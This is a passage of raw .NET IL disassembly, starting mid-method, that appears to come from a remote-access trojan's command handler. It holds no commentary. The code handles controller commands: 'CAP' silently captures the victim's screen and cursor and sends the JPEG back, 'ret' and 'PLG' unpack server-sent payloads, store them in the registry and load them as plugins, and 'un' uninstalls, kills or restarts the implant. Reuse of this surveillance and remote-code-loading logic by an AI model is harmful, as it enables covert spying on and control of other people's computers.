      IL_051f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0524:  pop
      IL_0525:  br.s       IL_052d

      IL_0527:  ldc.i4.1
      IL_0528:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_052d:  ldsfld     bool L::Cn
      IL_0532:  ldc.i4.0
      IL_0533:  ceq
      IL_0535:  box        [mscorlib]System.Boolean
      IL_053a:  ldloc.s    V_14
      IL_053c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0541:  ldnull
      IL_0542:  ldstr      "Off"
      IL_0547:  ldc.i4.0
      IL_0548:  newarr     [mscorlib]System.Object
      IL_054d:  ldnull
      IL_054e:  ldnull
      IL_054f:  ldnull
      IL_0550:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0555:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_055a:  ldc.i4.1
      IL_055b:  box        [mscorlib]System.Boolean
      IL_0560:  ldc.i4.0
      IL_0561:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_0566:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_056b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_0570:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0575:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_057a:  brfalse.s  IL_0527

      IL_057c:  ldloc.s    V_14
      IL_057e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0583:  ldnull
      IL_0584:  ldstr      "off"
      IL_0589:  ldc.i4.1
      IL_058a:  newarr     [mscorlib]System.Object
      IL_058f:  stloc.s    V_44
      IL_0591:  ldloc.s    V_44
      IL_0593:  ldc.i4.0
      IL_0594:  ldc.i4.1
      IL_0595:  box        [mscorlib]System.Boolean
      IL_059a:  stelem.ref
      IL_059b:  ldloc.s    V_44
      IL_059d:  ldnull
      IL_059e:  ldnull
      IL_059f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_05a4:  leave      IL_0c11

      IL_05a9:  ldloc.s    V_42
      IL_05ab:  ldstr      "ret"
      IL_05b0:  ldc.i4.0
      IL_05b1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_05b6:  ldc.i4.0
      IL_05b7:  bne.un     IL_0752

      IL_05bc:  ldloc.0
      IL_05bd:  ldc.i4.1
      IL_05be:  ldelem.ref
      IL_05bf:  ldc.i4.0
      IL_05c0:  newarr     [mscorlib]System.Byte
      IL_05c5:  call       object L::GTV(string,
                                         object)
      IL_05ca:  castclass  uint8[]
      IL_05cf:  stloc.s    V_17
      IL_05d1:  ldloc.0
      IL_05d2:  ldc.i4.2
      IL_05d3:  ldelem.ref
      IL_05d4:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_05d9:  ldc.i4.s   10
      IL_05db:  clt
      IL_05dd:  ldloc.s    V_17
      IL_05df:  ldlen
      IL_05e0:  conv.ovf.i4
      IL_05e1:  ldc.i4.0
      IL_05e2:  ceq
      IL_05e4:  and
      IL_05e5:  brfalse.s  IL_062d

      IL_05e7:  ldc.i4.5
      IL_05e8:  newarr     [mscorlib]System.String
      IL_05ed:  stloc.s    V_43
      IL_05ef:  ldloc.s    V_43
      IL_05f1:  ldc.i4.0
      IL_05f2:  ldstr      "pl"
      IL_05f7:  stelem.ref
      IL_05f8:  ldloc.s    V_43
      IL_05fa:  ldc.i4.1
      IL_05fb:  ldsfld     string L::Y
      IL_0600:  stelem.ref
      IL_0601:  ldloc.s    V_43
      IL_0603:  ldc.i4.2
      IL_0604:  ldloc.0
      IL_0605:  ldc.i4.1
      IL_0606:  ldelem.ref
      IL_0607:  stelem.ref
      IL_0608:  ldloc.s    V_43
      IL_060a:  ldc.i4.3
      IL_060b:  ldsfld     string L::Y
      IL_0610:  stelem.ref
      IL_0611:  ldloc.s    V_43
      IL_0613:  ldc.i4.4
      IL_0614:  ldc.i4.1
      IL_0615:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_061a:  stelem.ref
      IL_061b:  ldloc.s    V_43
      IL_061d:  call       string [mscorlib]System.String::Concat(string[])
      IL_0622:  call       bool L::Send(string)
      IL_0627:  pop
      IL_0628:  leave      IL_0c11

      IL_062d:  ldloc.0
      IL_062e:  ldc.i4.2
      IL_062f:  ldelem.ref
      IL_0630:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0635:  ldc.i4.s   10
      IL_0637:  ble.s      IL_0686

      IL_0639:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_063e:  stloc.s    V_20
      IL_0640:  ldloc.0
      IL_0641:  ldc.i4.0
      IL_0642:  ldelem.ref
      IL_0643:  ldsfld     string L::Y
      IL_0648:  ldloc.0
      IL_0649:  ldc.i4.1
      IL_064a:  ldelem.ref
      IL_064b:  ldsfld     string L::Y
      IL_0650:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0655:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_065a:  stloc.s    V_19
      IL_065c:  ldloc.s    V_20
      IL_065e:  ldarg.0
      IL_065f:  ldloc.s    V_19
      IL_0661:  ldarg.0
      IL_0662:  ldlen
      IL_0663:  conv.ovf.i4
      IL_0664:  ldloc.s    V_19
      IL_0666:  sub.ovf
      IL_0667:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_066c:  ldloc.s    V_20
      IL_066e:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0673:  call       uint8[] L::ZIP(uint8[])
      IL_0678:  stloc.s    V_17
      IL_067a:  ldloc.0
      IL_067b:  ldc.i4.1
      IL_067c:  ldelem.ref
      IL_067d:  ldloc.s    V_17
      IL_067f:  ldc.i4.3
      IL_0680:  call       bool L::STV(string,
                                       object,
                                       valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0685:  pop
      IL_0686:  ldc.i4.5
      IL_0687:  newarr     [mscorlib]System.String
      IL_068c:  stloc.s    V_43
      IL_068e:  ldloc.s    V_43
      IL_0690:  ldc.i4.0
      IL_0691:  ldstr      "pl"
      IL_0696:  stelem.ref
      IL_0697:  ldloc.s    V_43
      IL_0699:  ldc.i4.1
      IL_069a:  ldsfld     string L::Y
      IL_069f:  stelem.ref
      IL_06a0:  ldloc.s    V_43
      IL_06a2:  ldc.i4.2
      IL_06a3:  ldloc.0
      IL_06a4:  ldc.i4.1
      IL_06a5:  ldelem.ref
      IL_06a6:  stelem.ref
      IL_06a7:  ldloc.s    V_43
      IL_06a9:  ldc.i4.3
      IL_06aa:  ldsfld     string L::Y
      IL_06af:  stelem.ref
      IL_06b0:  ldloc.s    V_43
      IL_06b2:  ldc.i4.4
      IL_06b3:  ldc.i4.0
      IL_06b4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_06b9:  stelem.ref
      IL_06ba:  ldloc.s    V_43
      IL_06bc:  call       string [mscorlib]System.String::Concat(string[])
      IL_06c1:  call       bool L::Send(string)
      IL_06c6:  pop
      IL_06c7:  ldloc.s    V_17
      IL_06c9:  ldstr      "A"
      IL_06ce:  call       object L::Plugin(uint8[],
                                            string)
      IL_06d3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_06d8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_06dd:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_06e2:  stloc.s    V_18
      IL_06e4:  ldc.i4.5
      IL_06e5:  newarr     [mscorlib]System.String
      IL_06ea:  stloc.s    V_43
      IL_06ec:  ldloc.s    V_43
      IL_06ee:  ldc.i4.0
      IL_06ef:  ldstr      "ret"
      IL_06f4:  stelem.ref
      IL_06f5:  ldloc.s    V_43
      IL_06f7:  ldc.i4.1
      IL_06f8:  ldsfld     string L::Y
      IL_06fd:  stelem.ref
      IL_06fe:  ldloc.s    V_43
      IL_0700:  ldc.i4.2
      IL_0701:  ldloc.0
      IL_0702:  ldc.i4.1
      IL_0703:  ldelem.ref
      IL_0704:  stelem.ref
      IL_0705:  ldloc.s    V_43
      IL_0707:  ldc.i4.3
      IL_0708:  ldsfld     string L::Y
      IL_070d:  stelem.ref
      IL_070e:  ldloc.s    V_43
      IL_0710:  ldc.i4.4
      IL_0711:  ldloc.s    V_18
      IL_0713:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0718:  ldnull
      IL_0719:  ldstr      "GT"
      IL_071e:  ldc.i4.0
      IL_071f:  newarr     [mscorlib]System.Object
      IL_0724:  ldnull
      IL_0725:  ldnull
      IL_0726:  ldnull
      IL_0727:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_072c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0731:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0736:  stloc.s    V_45
      IL_0738:  ldloca.s   V_45
      IL_073a:  call       string L::ENB(string&)
      IL_073f:  stelem.ref
      IL_0740:  ldloc.s    V_43
      IL_0742:  call       string [mscorlib]System.String::Concat(string[])
      IL_0747:  call       bool L::Send(string)
      IL_074c:  pop
      IL_074d:  leave      IL_0c11

      IL_0752:  ldloc.s    V_42
      IL_0754:  ldstr      "CAP"
      IL_0759:  ldc.i4.0
      IL_075a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_075f:  ldc.i4.0
      IL_0760:  bne.un     IL_090c

      IL_0765:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_076a:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_076f:  stloc.s    V_23
      IL_0771:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0776:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_077b:  stloc.s    V_49
      IL_077d:  ldloca.s   V_49
      IL_077f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0784:  ldloca.s   V_23
      IL_0786:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_078b:  ldc.i4     0x21005
      IL_0790:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_0795:  stloc.s    V_26
      IL_0797:  ldloc.s    V_26
      IL_0799:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_079e:  stloc.s    V_25
      IL_07a0:  ldloca.s   V_22
      IL_07a2:  ldloc.s    V_26
      IL_07a4:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_07a9:  ldloc.s    V_26
      IL_07ab:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_07b0:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_07b5:  ldloc.s    V_25
      IL_07b7:  ldc.i4.0
      IL_07b8:  ldc.i4.0
      IL_07b9:  ldc.i4.0
      IL_07ba:  ldc.i4.0
      IL_07bb:  ldloc.s    V_22
      IL_07bd:  ldc.i4     0xcc0020
      IL_07c2:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_07c7:  ldloca.s   V_22
        IL_07c9:  ldc.i4.s   32
        IL_07cb:  ldc.i4.s   32
        IL_07cd:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_07d2:  ldloca.s   V_23
        IL_07d4:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_07d9:  ldloc.s    V_22
        IL_07db:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_07e0:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_07e5:  ldloc.s    V_25
        IL_07e7:  ldloc.s    V_23
        IL_07e9:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_07ee:  leave.s    IL_080f

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_07f0:  dup
        IL_07f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_07f6:  stloc.s    V_29
        IL_07f8:  ldloc.s    V_29
        IL_07fa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_07ff:  ldloc.s    V_29
        IL_0801:  stloc.s    V_30
        IL_0803:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0808:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_080d:  leave.s    IL_080f

      }  // end handler
      IL_080f:  ldloc.s    V_25
      IL_0811:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_0816:  ldloc.0
      IL_0817:  ldc.i4.1
      IL_0818:  ldelem.ref
      IL_0819:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_081e:  ldloc.0
      IL_081f:  ldc.i4.2
      IL_0820:  ldelem.ref
      IL_0821:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0826:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_082b:  stloc.s    V_21
      IL_082d:  ldloc.s    V_21
      IL_082f:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_0834:  stloc.s    V_25
      IL_0836:  ldloc.s    V_25
      IL_0838:  ldloc.s    V_26
      IL_083a:  ldc.i4.0
      IL_083b:  ldc.i4.0
      IL_083c:  ldloc.s    V_21
      IL_083e:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_0843:  ldloc.s    V_21
      IL_0845:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_084a:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_084f:  ldloc.s    V_25
      IL_0851:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_0856:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_085b:  stloc.s    V_27
      IL_085d:  ldstr      "CAP"
      IL_0862:  ldsfld     string L::Y
      IL_0867:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_086c:  stloc.s    V_45
      IL_086e:  ldloca.s   V_45
      IL_0870:  call       uint8[] L::SB(string&)
      IL_0875:  starg.s    b
      IL_0877:  ldloc.s    V_27
      IL_0879:  ldarg.0
      IL_087a:  ldc.i4.0
      IL_087b:  ldarg.0
      IL_087c:  ldlen
      IL_087d:  conv.ovf.i4
      IL_087e:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0883:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0888:  stloc.s    V_28
      IL_088a:  ldloc.s    V_21
      IL_088c:  ldloc.s    V_28
      IL_088e:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_0893:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_0898:  ldloc.s    V_28
      IL_089a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_089f:  call       string L::md5(uint8[])
      IL_08a4:  stloc.s    V_24
      IL_08a6:  ldloc.s    V_24
      IL_08a8:  ldsfld     string L::lastcap
      IL_08ad:  ldc.i4.0
      IL_08ae:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_08b3:  ldc.i4.0
      IL_08b4:  beq.s      IL_08d6

      IL_08b6:  ldloc.s    V_24
      IL_08b8:  stsfld     string L::lastcap
      IL_08bd:  ldloc.s    V_27
      IL_08bf:  ldloc.s    V_28
      IL_08c1:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_08c6:  ldc.i4.0
      IL_08c7:  ldloc.s    V_28
      IL_08c9:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_08ce:  conv.ovf.i4
      IL_08cf:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_08d4:  br.s       IL_08de

      IL_08d6:  ldloc.s    V_27
      IL_08d8:  ldc.i4.0
      IL_08d9:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_08de:  ldloc.s    V_27
      IL_08e0:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_08e5:  call       bool L::Sendb(uint8[])
      IL_08ea:  pop
      IL_08eb:  ldloc.s    V_27
      IL_08ed:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_08f2:  ldloc.s    V_28
      IL_08f4:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_08f9:  ldloc.s    V_26
      IL_08fb:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_0900:  ldloc.s    V_21
      IL_0902:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_0907:  leave      IL_0c11

      IL_090c:  ldloc.s    V_42
      IL_090e:  ldstr      "un"
      IL_0913:  ldc.i4.0
      IL_0914:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0919:  ldc.i4.0
      IL_091a:  bne.un.s   IL_0990

      IL_091c:  ldloc.0
      IL_091d:  ldc.i4.1
      IL_091e:  ldelem.ref
      IL_091f:  stloc.s    V_50
      IL_0921:  ldloc.s    V_50
      IL_0923:  ldstr      "~"
      IL_0928:  ldc.i4.0
      IL_0929:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_092e:  ldc.i4.0
      IL_092f:  bne.un.s   IL_093b

      IL_0931:  call       void L::UNS()
      IL_0936:  leave      IL_0c11

      IL_093b:  ldloc.s    V_50
      IL_093d:  ldstr      "!"
      IL_0942:  ldc.i4.0
      IL_0943:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0948:  ldc.i4.0
      IL_0949:  bne.un.s   IL_095b

      IL_094b:  ldc.i4.0
      IL_094c:  call       void L::pr(int32)
      IL_0951:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0956:  leave      IL_0c11

      IL_095b:  ldloc.s    V_50
      IL_095d:  ldstr      "@"
      IL_0962:  ldc.i4.0
      IL_0963:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0968:  ldc.i4.0
      IL_0969:  bne.un.s   IL_098b

      IL_096b:  ldc.i4.0
      IL_096c:  call       void L::pr(int32)
      IL_0971:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
      IL_0976:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_097b:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0980:  pop
      IL_0981:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0986:  leave      IL_0c11

      IL_098b:  leave      IL_0c11

      IL_0990:  ldloc.3
      IL_0991:  ldstr      "Ex"
      IL_0996:  ldc.i4.0
      IL_0997:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_099c:  ldc.i4.0
      IL_099d:  bne.un     IL_0a74

      IL_09a2:  ldsfld     object L::PLG
      IL_09a7:  brtrue.s   IL_09fe

      IL_09a9:  ldstr      "PLG"
      IL_09ae:  call       bool L::Send(string)
      IL_09b3:  pop
      IL_09b4:  ldc.i4.0
      IL_09b5:  stloc.s    V_33
      IL_09b7:  br.s       IL_09c9

      IL_09b9:  ldloc.s    V_33
      IL_09bb:  ldc.i4.1
      IL_09bc:  add.ovf
      IL_09bd:  stloc.s    V_33
      IL_09bf:  ldc.i4     0x3e8
      IL_09c4:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_09c9:  ldsfld     object L::PLG
      IL_09ce:  ldnull
      IL_09cf:  ceq
      IL_09d1:  ldc.i4.0
      IL_09d2:  ceq
      IL_09d4:  ldloc.s    V_33
      IL_09d6:  ldc.i4.s   20
      IL_09d8:  ceq
      IL_09da:  or
      IL_09db:  ldsfld     bool L::Cn
      IL_09e0:  ldc.i4.0
      IL_09e1:  ceq
      IL_09e3:  or
      IL_09e4:  brfalse.s  IL_09b9

      IL_09e6:  ldsfld     object L::PLG
      IL_09eb:  ldnull
      IL_09ec:  ceq
      IL_09ee:  ldsfld     bool L::Cn
      IL_09f3:  ldc.i4.0
      IL_09f4:  ceq
      IL_09f6:  or
      IL_09f7:  brfalse.s  IL_09fe

      IL_09f9:  leave      IL_0c11

      IL_09fe:  ldc.i4.1
      IL_09ff:  newarr     [mscorlib]System.Object
      IL_0a04:  stloc.s    V_44
      IL_0a06:  ldloc.s    V_44
      IL_0a08:  ldc.i4.0
      IL_0a09:  ldarg.0
      IL_0a0a:  stelem.ref
      IL_0a0b:  ldloc.s    V_44
      IL_0a0d:  stloc.s    V_31
      IL_0a0f:  ldc.i4.1
      IL_0a10:  newarr     [mscorlib]System.Boolean
      IL_0a15:  stloc.s    V_51
      IL_0a17:  ldloc.s    V_51
      IL_0a19:  ldc.i4.0
      IL_0a1a:  ldc.i4.1
      IL_0a1b:  stelem.i1
      IL_0a1c:  ldloc.s    V_51
      IL_0a1e:  stloc.s    V_32
      IL_0a20:  ldsfld     object L::PLG
      IL_0a25:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0a2a:  ldnull
      IL_0a2b:  ldstr      "ind"
      IL_0a30:  ldloc.s    V_31
      IL_0a32:  ldnull
      IL_0a33:  ldnull
      IL_0a34:  ldloc.s    V_32
      IL_0a36:  ldc.i4.1
      IL_0a37:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0a3c:  pop
      IL_0a3d:  ldloc.s    V_32
      IL_0a3f:  ldc.i4.0
      IL_0a40:  ldelem.i1
      IL_0a41:  brfalse    IL_0b59

      IL_0a46:  ldloc.s    V_31
      IL_0a48:  ldc.i4.0
      IL_0a49:  ldelem.ref
      IL_0a4a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0a4f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0a54:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0a59:  ldtoken    uint8[]
      IL_0a5e:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0a63:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0a68:  castclass  uint8[]
      IL_0a6d:  starg.s    b
      IL_0a6f:  leave      IL_0c11

      IL_0a74:  ldloc.3
      IL_0a75:  ldstr      "PLG"
      IL_0a7a:  ldc.i4.0
      IL_0a7b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a80:  ldc.i4.0
      IL_0a81:  bne.un     IL_0b59

      IL_0a86:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0a8b:  stloc.s    V_35
      IL_0a8d:  ldloc.0
      IL_0a8e:  ldc.i4.0
      IL_0a8f:  ldelem.ref
      IL_0a90:  ldsfld     string L::Y
      IL_0a95:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0a9a:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0a9f:  stloc.s    V_34
      IL_0aa1:  ldloc.s    V_35
      IL_0aa3:  ldarg.0
      IL_0aa4:  ldloc.s    V_34
      IL_0aa6:  ldarg.0
      IL_0aa7:  ldlen
      IL_0aa8:  conv.ovf.i4
      IL_0aa9:  ldloc.s    V_34
      IL_0aab:  sub.ovf
      IL_0aac:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0ab1:  ldloc.s    V_35
      IL_0ab3:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0ab8:  call       uint8[] L::ZIP(uint8[])
      IL_0abd:  ldstr      "A"
      IL_0ac2:  call       object L::Plugin(uint8[],
                                            string)
      IL_0ac7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0acc:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0ad1:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0ad6:  stsfld     object L::PLG
      IL_0adb:  ldsfld     object L::PLG
      IL_0ae0:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0ae5:  ldnull
      IL_0ae6:  ldstr      "H"
      IL_0aeb:  ldc.i4.1
      IL_0aec:  newarr     [mscorlib]System.Object
      IL_0af1:  stloc.s    V_44
      IL_0af3:  ldloc.s    V_44
      IL_0af5:  ldc.i4.0
      IL_0af6:  ldsfld     string L::H
      IL_0afb:  stelem.ref
      IL_0afc:  ldloc.s    V_44
      IL_0afe:  ldnull
      IL_0aff:  ldnull
      IL_0b00:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0b05:  ldsfld     object L::PLG
